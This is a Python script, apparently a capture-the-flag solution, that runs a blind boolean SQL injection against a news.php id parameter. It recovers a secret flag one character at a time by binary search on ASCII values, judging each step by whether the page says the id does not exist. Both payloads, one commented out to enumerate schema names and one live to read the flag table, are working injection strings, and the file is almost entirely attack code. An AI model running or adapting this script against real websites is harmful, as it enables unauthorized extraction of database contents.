import requests

target = 'BreakALLCTF{'
for i in range(20):
    min_ = 0
    max_ = 128

    while min_ <= max_:
        print(min_, max_)
        if min_ == max_:
            target += chr(min_)
            print(target)
            break
        
        mid_ = int((min_ + max_) / 2)
        #payload = 'http://kaibro.tw:10002/news.php?id=-1' + ' or (select ascii(mid((select schema_name from information_schema.schemata limit 0,1), {}, 1))>{})'.format(len(target) + 1, mid_)
        payload = 'http://kaibro.tw:10002/news.php?id=-11 or (select ascii(mid((select THIS_IS_FLAG_YO from fl4g.secret limit 0,1),{},1))>{})'.format(len(target) + 1, mid_)
        try:
            res = requests.get(payload)
        except:
            print('error', min_, max_)
            continue
        if 'The id doesn\'t exist' in res.text:
            max_ = mid_
        else:
            min_ = mid_ + 1
